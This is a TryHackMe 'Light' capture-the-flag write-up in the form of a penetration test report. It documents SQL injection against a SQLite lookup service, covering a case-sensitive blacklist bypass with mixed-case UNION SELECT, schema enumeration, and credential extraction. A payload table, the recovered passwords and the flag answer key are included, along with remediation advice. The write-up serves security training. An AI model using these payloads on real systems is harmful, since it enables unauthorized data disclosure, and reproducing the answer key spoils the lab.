# Security Assessment Report - Light (TryHackMe)

**Analyst:** Felipe Campolina  
**Role:** Cybersecurity Analyst / Penetration Tester  
**Platform:** TryHackMe  
**Room:** Light  
**Category:** Web/Application Security - Database Exploitation  
**Environment:** Kali Linux  
**Target:** `10.67.142.120`  
**Exposed service:** `1337/TCP`  
**Database:** SQLite 3.31.1  
**Status:** Completed - 3/3 answers recovered  
**Challenge URL:** https://tryhackme.com/room/lightroom

> TryHackMe target addresses are assigned per lab session. Replace `10.67.142.120` with the address shown in the active room if it differs.

> **Ethics and scope:** Every technique in this write-up was used against the authorized TryHackMe Light environment. Do not test these payloads against systems without explicit permission.

---

## Executive Summary

This assessment documents the exploitation of the **Light** database application, a custom TCP service exposed on port `1337`. The application accepted a username and returned the associated password from an SQLite database.

Manual interaction revealed that user input was concatenated directly into an SQL query. Boolean tests confirmed SQL injection, while error messages exposed part of the query structure. Although the application attempted to block SQL keywords and comment sequences, its case-sensitive blacklist was bypassed with mixed-case keywords such as `UnIoN SeLeCt`.

The vulnerability allowed unrestricted read access to the SQLite catalog and application tables. Database enumeration exposed the administrative username, password, and challenge flag.

**Key findings:**

- **Critical:** UNION-based SQL injection in the username lookup.
- **High:** Administrative credentials stored in recoverable plaintext.
- **Medium:** Case-sensitive blacklist that provided no effective SQL injection protection.
- **Medium:** Verbose database errors disclosed query syntax and backend behavior.

**Demonstrated impact:** unauthorized disclosure of all records in `usertable` and `admintable`, including administrative credentials and the challenge flag.

---

## Objectives

- Confirm that the custom TCP service was reachable.
- Understand how the application processed usernames.
- Test whether input could alter the backend query.
- Identify and bypass the application's blacklist.
- Fingerprint the database engine and version.
- Enumerate the SQLite schema and stored records.
- Recover the administrator username, password, and flag.
- Document defensive controls that would prevent the vulnerability.

---

## Environment and Tools

| Component | Purpose |
| --- | --- |
| Kali Linux | Assessment environment |
| Nmap | TCP port validation and service probing |
| Netcat | Interactive communication with the custom service |
| SQLite functions | Schema enumeration and result aggregation through SQL injection |
| TryHackMe | Authorized lab environment and answer validation |

The room supplied `smokey` as the initial username and recommended connecting to the database application with Netcat.

---

## Methodology

1. Validate TCP port `1337` with Nmap.
2. Connect directly with Netcat and establish a behavioral baseline.
3. Submit malformed input and inspect database errors.
4. Compare true and false Boolean conditions.
5. Identify the blacklist and test its case sensitivity.
6. Use a one-column `UNION` payload to fingerprint SQLite.
7. Query `sqlite_master` to discover tables and schemas.
8. Concatenate fields to fit the application's single-column output.
9. Aggregate multiple rows with `group_concat()`.
10. Extract the administrative credentials and flag.

---

## Step-by-Step Walkthrough

### 1. Initial Reconnaissance

The room exposed the Light application on TCP port `1337`. The first scan attempted service and default-script detection:

```bash
nmap -sV -sC -p 1337 10.67.142.120
```

Service fingerprinting stalled at:

```text
Service scan Timing: About 0.00% done
```

The likely explanation was that the custom application did not respond as expected to Nmap's version-detection probes. A faster TCP connect scan was then used:

```bash
nmap -Pn -n -sT -p 1337 --max-retries 1 10.67.142.120
```

Result:

```text
Starting Nmap 7.95

Nmap scan report for 10.67.142.120
Host is up (0.13s latency).

PORT     STATE SERVICE
1337/tcp open  waste

Nmap done: 1 IP address (1 host up)
scanned in 0.14 seconds
```

A default-script scan was also run:

```bash
nmap -sC -p 1337 10.67.142.120
```

The port remained open.

The `waste` label is Nmap's conventional service association for port `1337`; it does not prove that the target implemented the WASTE protocol. The reliable observation was simply that a TCP service was listening.

---

### 2. Application Enumeration with Netcat

The application was accessed directly:

```bash
nc 10.67.142.120 1337
```

Banner:

```text
Welcome to the Light database!
Please enter your username:
```

Submitting the room-provided username returned a password:

```text
Please enter your username: smokey
Password: vYQ5ngPpw8AdUmL
```

Unknown usernames produced a different response:

```text
Please enter your username: admin
Username not found.

Please enter your username: test
Username not found.
```

This did not resemble a conventional login flow. The service appeared to use the submitted username as a database lookup key and return the stored password directly.

Based on later errors and behavior, the backend query was inferred to resemble:

```sql
SELECT password
FROM usertable
WHERE username = '<INPUT>'
LIMIT 30;
```

This query is an analytical reconstruction. The application's source code was not available, so it must not be treated as an observed implementation.

---

### 3. Identifying Input Filtering

Several initial values were submitted to understand how the service handled input:

```text
.
`
1
DELETE
SELECT *
SELECT * FROM users
```

Inputs containing `SELECT` triggered:

```text
Ahh there is a word in there I don't like :(
```

This indicated a keyword blacklist operating before the input reached the database. A blacklist can identify a few known strings, but it does not safely separate user data from SQL syntax.

---

### 4. Confirming SQL Injection

#### Syntax-error test

A single quote was submitted:

```sql
'
```

The application returned:

```text
Error: unrecognized token: "''' LIMIT 30"
```

The test was repeated with a valid username followed by a quote:

```sql
smokey'
```

Result:

```text
Error: unrecognized token: "'smokey'' LIMIT 30"
```

These errors showed that the quote changed the SQL syntax and exposed the appended `LIMIT 30` clause. The `unrecognized token` wording was compatible with SQLite, although the exact engine and version had not yet been proven.

#### Initial logical manipulation

The first functional injection was:

```sql
smokey' OR '1'='1
```

Result:

```text
Password: tF8tj2o94WE4LKC
```

The returned password differed from Smokey's password. Later enumeration established that it belonged to `alice`, the first record in `usertable`. The tautology had broadened the result set beyond the requested username.

#### Controlled Boolean verification

A true condition was tested:

```sql
smokey' AND '1'='1
```

```text
Password: vYQ5ngPpw8AdUmL
```

A false condition was then tested:

```sql
smokey' AND '1'='2
```

```text
Username not found.
```

The controlled difference confirmed that the input could modify the query's logical outcome.

**Finding confirmed: SQL injection.**

---

### 5. Investigating and Bypassing the Blacklist

The next objective was to extract arbitrary data through `UNION SELECT`. A conventional payload with an SQL comment was attempted:

```sql
' UNION SELECT sqlite_version() --
```

The application explicitly rejected the comment sequence:

```text
For strange reasons I can't explain,
any input containing /*, -- or, %0b
is not allowed :)
```

The disclosed blocked patterns were:

```text
/*
--
%0b
```

Instead of commenting out the remainder of the original query, the payload had to remain valid when the application appended its closing quote. The following attempt still triggered the keyword filter:

```sql
' UNION SELECT sqlite_version() WHERE '1'='1
```

```text
Ahh there is a word in there I don't like :(
```

Because SQL keywords are generally case-insensitive, mixed capitalization was tested against what appeared to be a case-sensitive filter:

```sql
' UnIoN SeLeCt sqlite_version() WHERE '1'='1
```

Result:

```text
Password: 3.31.1
```

This result established five facts:

1. The initial quote escaped the original string value.
2. `UnIoN SeLeCt` bypassed the blacklist.
3. The database parsed the mixed-case keywords normally.
4. The injected query's value was reflected in the password response.
5. The backend used SQLite `3.31.1`.

The resulting query likely behaved similarly to:

```sql
SELECT password
FROM usertable
WHERE username = ''
UNION SELECT sqlite_version()
WHERE '1'='1'
LIMIT 30;
```

This remains a reconstruction based on observed behavior. The final `WHERE '1'='1` balanced the application's appended quote without needing a comment.

**Finding confirmed: one-column UNION-based SQL injection with a mixed-case blacklist bypass.**

---

### 6. Enumerating the SQLite Schema

SQLite stores schema metadata in `sqlite_master`. Useful columns include `type`, `name`, `tbl_name`, `rootpage`, and `sql`.

The first table-enumeration payload was:

```sql
' UnIoN SeLeCt name FROM sqlite_master WHERE type='table
```

Result:

```text
Password: admintable
```

Only one row was displayed by the application, so this did not establish that `admintable` was the only table.

The table definition was retrieved from the `sql` field:

```sql
' UnIoN SeLeCt sql FROM sqlite_master WHERE name='admintable
```

Result:

```sql
CREATE TABLE admintable (
    id INTEGER PRIMARY KEY,
    username TEXT,
    password INTEGER
)
```

| Column | Declared type |
| --- | --- |
| `id` | `INTEGER PRIMARY KEY` |
| `username` | `TEXT` |
| `password` | `INTEGER` |

SQLite uses dynamic typing and type affinity, so a column declared as `INTEGER` can still hold textual password values. The declaration therefore did not prevent the credentials from being returned as strings.

---

### 7. Extracting the Administrative Credentials

The original query appeared to return one column. SQLite's `||` operator was used to combine `username` and `password` into a single compatible value:

```sql
' UnIoN SeLeCt username || ' : ' || password FROM admintable WHERE '1'='1
```

Result:

```text
Password: TryHackMeAdmin : mamZtAuMlrsEy5bp6q17
```

Recovered credentials:

| Field | Value |
| --- | --- |
| Administrator username | `TryHackMeAdmin` |
| Administrator password | `mamZtAuMlrsEy5bp6q17` |

The concatenation solved the column-count constraint: both sides of a `UNION` must return the same number of columns, so two fields were converted into one output expression.

---

### 8. Testing the Administrative Username Normally

A new Netcat connection was opened:

```bash
nc 10.67.142.120 1337
```

Submitting the recovered administrator name produced:

```text
TryHackMeAdmin
```

```text
Username not found.
```

This was consistent with the normal application query using only `usertable`. The administrative account existed in `admintable` and was accessible only after the injection allowed arbitrary table selection.

---

### 9. Enumerating All Tables and Objects

Because the application displayed one result, `group_concat()` was used to aggregate multiple catalog rows:

```sql
' UnIoN SeLeCt group_concat(name, ' | ') FROM sqlite_master WHERE type='table
```

Result:

```text
Password: usertable | admintable
```

The catalog contained two tables:

- `usertable`
- `admintable`

All displayed object types and names were then aggregated:

```sql
' UnIoN SeLeCt group_concat(type || ' : ' || name, ' | ') FROM sqlite_master WHERE '1'='1
```

Result:

```text
Password: table : usertable | table : admintable
```

No additional objects were present in the returned catalog data.

---

### 10. Enumerating `usertable`

The table definition was recovered:

```sql
' UnIoN SeLeCt sql FROM sqlite_master WHERE name='usertable
```

```sql
CREATE TABLE usertable (
    id INTEGER PRIMARY KEY,
    username TEXT,
    password INTEGER
)
```

Every row was aggregated into one response:

```sql
' UnIoN SeLeCt group_concat(id || ' : ' || username || ' : ' || password, ' | ') FROM usertable WHERE '1'='1
```

Recovered records:

| ID | Username | Password |
| --- | --- | --- |
| 1 | `alice` | `tF8tj2o94WE4LKC` |
| 2 | `rob` | `yAn4fPaF2qpCKpR` |
| 3 | `john` | `e74tqwRh2oApPo6` |
| 4 | `michael` | `7DV4dwA0g5FacRe` |
| 5 | `smokey` | `vYQ5ngPpw8AdUmL` |
| 6 | `hazel` | `EcSuU35WlVipjXG` |
| 7 | `ralph` | `YO1U9O1m52aJImA` |
| 8 | `steve` | `WObjufHX1foR8d7` |

This output explained the earlier tautology result. The password returned for `smokey' OR '1'='1` belonged to Alice, the first row in the table.

No flag was present in the returned `usertable` records.

---

### 11. Recovering the Flag

The first query against `admintable` displayed only the administrator record, but it did not prove that the table contained a single row. The same aggregation technique was therefore applied to the administrative table:

```sql
' UnIoN SeLeCt group_concat(id || ' : ' || username || ' : ' || password, ' | ') FROM admintable WHERE '1'='1
```

Result:

```text
Password: 1 : TryHackMeAdmin : mamZtAuMlrsEy5bp6q17 | 2 : flag : THM{SQLit3_InJ3cTion_is_SimplE_nO?}
```

The table contained two records:

| ID | Username | Password |
| --- | --- | --- |
| 1 | `TryHackMeAdmin` | `mamZtAuMlrsEy5bp6q17` |
| 2 | `flag` | `THM{SQLit3_InJ3cTion_is_SimplE_nO?}` |

The flag was not stored in a dedicated flag column. It was the `password` value of a row whose username was `flag`.

**Flag recovered:**

```text
THM{SQLit3_InJ3cTion_is_SimplE_nO?}
```

---

## Attack Chain

```text
TCP reconnaissance
        |
        v
Port 1337 confirmed open
        |
        v
Manual Netcat interaction
        |
        v
Single-quote syntax error
        |
        v
True/false Boolean tests
        |
        v
SQL injection confirmed
        |
        v
Blacklist and comment restrictions identified
        |
        v
Mixed-case UnIoN SeLeCt bypass
        |
        v
SQLite 3.31.1 fingerprinted
        |
        v
sqlite_master enumerated
        |
        v
usertable and admintable discovered
        |
        v
Administrative credentials extracted
        |
        v
Multiple rows aggregated with group_concat()
        |
        v
Flag recovered from admintable
```

---

## Payload Reference

| Objective | Payload |
| --- | --- |
| Trigger a syntax error | `'` |
| Broaden the result set | `smokey' OR '1'='1` |
| Test a true condition | `smokey' AND '1'='1` |
| Test a false condition | `smokey' AND '1'='2` |
| Identify SQLite | `' UnIoN SeLeCt sqlite_version() WHERE '1'='1` |
| Return the first table name | `' UnIoN SeLeCt name FROM sqlite_master WHERE type='table` |
| Recover `admintable` schema | `' UnIoN SeLeCt sql FROM sqlite_master WHERE name='admintable` |
| Extract admin credentials | `' UnIoN SeLeCt username \|\| ' : ' \|\| password FROM admintable WHERE '1'='1` |
| List all table names | `' UnIoN SeLeCt group_concat(name, ' \| ') FROM sqlite_master WHERE type='table` |
| List catalog objects | `' UnIoN SeLeCt group_concat(type \|\| ' : ' \|\| name, ' \| ') FROM sqlite_master WHERE '1'='1` |
| Recover `usertable` schema | `' UnIoN SeLeCt sql FROM sqlite_master WHERE name='usertable` |
| Extract every user | `' UnIoN SeLeCt group_concat(id \|\| ' : ' \|\| username \|\| ' : ' \|\| password, ' \| ') FROM usertable WHERE '1'='1` |
| Recover the flag | `' UnIoN SeLeCt group_concat(id \|\| ' : ' \|\| username \|\| ' : ' \|\| password, ' \| ') FROM admintable WHERE '1'='1` |

The backslashes in this Markdown table only escape the `|` table delimiter. The SQLite concatenation operator submitted to the application was `||`.

---

## Findings

| Finding | Classification | Severity | Demonstrated impact |
| --- | --- | --- | --- |
| SQL injection in username lookup | CWE-89 | Critical | Arbitrary read access to application tables |
| Recoverable plaintext credentials | CWE-256 | High | Disclosure of all user and administrator passwords |
| Case-sensitive SQL keyword blacklist | Ineffective input filtering | Medium | Trivial bypass with mixed capitalization |
| Verbose SQL errors | CWE-209 | Medium | Disclosure of query syntax and backend behavior |
| Administrative and user data reachable through one query context | Insufficient data separation | High | Access to data outside the intended application flow |

### Scope of Demonstrated Impact

The assessment proved that the vulnerability allowed:

- Logical manipulation of the original query.
- One-column `UNION` queries.
- Database version fingerprinting.
- SQLite catalog and schema enumeration.
- Extraction of all displayed user and administrative records.
- Recovery of the administrator credentials and flag.

The lab did not require or demonstrate database writes, record modification, operating-system command execution, or host compromise. Those impacts are therefore not claimed in this report.

---

## Questions and Answers

| # | TryHackMe question | Answer |
| --- | --- | --- |
| 1 | What is the admin username? | `TryHackMeAdmin` |
| 2 | What is the password to the username mentioned in question 1? | `mamZtAuMlrsEy5bp6q17` |
| 3 | What is the flag? | `THM{SQLit3_InJ3cTion_is_SimplE_nO?}` |

---

## Remediation Recommendations

### 1. Use Parameterized Queries

The primary fix is to keep user-controlled values separate from SQL syntax. A safe Python SQLite query would resemble:

```python
username = input("Please enter your username: ")

cursor.execute(
    """
    SELECT password
    FROM usertable
    WHERE username = ?
    LIMIT 30
    """,
    (username,)
)
```

The `?` placeholder causes SQLite to treat the username as data. Quotes, operators, and SQL keywords in the supplied value cannot change the query structure.

### 2. Remove Blacklist-Based SQL Defenses

Blocking strings such as `SELECT`, `UNION`, `--`, or `/*` does not address the cause of SQL injection. Attackers can use capitalization, alternate syntax, encoding, or database-specific features. Parameterization must be the primary control; context-appropriate validation should be an additional layer.

### 3. Never Return Stored Passwords

The service returned password fields directly. Real authentication systems should store passwords with a purpose-built password hashing algorithm such as Argon2id, using a unique salt for every account. Authentication should compare a password candidate against the stored hash, never disclose the stored value.

### 4. Separate Sensitive Data

The component performing ordinary user lookups should not be able to retrieve administrative secrets. SQLite does not provide a client-server privilege model, so separation must be enforced through application architecture, separate database files where appropriate, operating-system file permissions, and isolated components.

### 5. Restrict Error Messages

Errors such as the following exposed internal query fragments:

```text
Error: unrecognized token: "'smokey'' LIMIT 30"
```

Production applications should log detailed errors securely on the server and return a generic message to the client.

### 6. Add Automated Security Testing

Integration tests should confirm that quotes, SQL operators, keywords, comment sequences, and unexpected encodings are handled as literal data. Static analysis and authorized dynamic testing should be incorporated into the development lifecycle.

---

## Conclusion

The Light room demonstrated a complete SQL injection investigation against a constrained custom TCP interface. Direct interaction with Netcat was more informative than prolonged service fingerprinting, and a single quote exposed both unsafe query construction and the appended `LIMIT 30` clause.

Controlled true and false conditions confirmed SQL injection. A case-sensitive blacklist initially blocked conventional `UNION SELECT` syntax and SQL comments, but mixed capitalization bypassed the filter. The resulting one-column UNION injection fingerprinted SQLite 3.31.1, enumerated `sqlite_master`, disclosed both application tables, and recovered their contents.

The final breakthrough was recognizing that the first returned row was not necessarily the only row. Applying `group_concat()` to `admintable` revealed a second record containing the flag. The exercise proved unauthorized disclosure of sensitive database content without overstating untested impacts such as database modification or host-level execution.

---

## Lessons Learned

- Custom services may be understood faster through direct protocol interaction than automated fingerprinting.
- Database errors can reveal query delimiters, appended clauses, and backend characteristics.
- Positive and negative Boolean controls are essential for confirming injection reliably.
- Blacklists do not provide a security boundary and often fail through simple syntax variations.
- SQLite's `sqlite_master` table is central to schema discovery after read access is obtained.
- Concatenation solves column-count constraints, while `group_concat()` prevents hidden rows from being overlooked.
- The first visible result must never be assumed to represent the complete dataset.
- Findings should distinguish demonstrated confidentiality impact from untested integrity or system-compromise scenarios.

---

## Final Thoughts

Light is a compact but well-structured SQL injection exercise. Its value comes from requiring more than a basic authentication bypass: the room teaches controlled vulnerability confirmation, blacklist analysis, database fingerprinting, schema discovery, one-column data extraction, and multi-row aggregation. The final flag location rewards systematic enumeration instead of guesswork.

## Challenge Rating

⭐⭐⭐⭐ (Excellent practical introduction to Boolean and UNION-based SQLite injection, filter bypass, and database enumeration)

---

*This report documents authorized testing performed in a controlled TryHackMe environment for educational purposes only.*
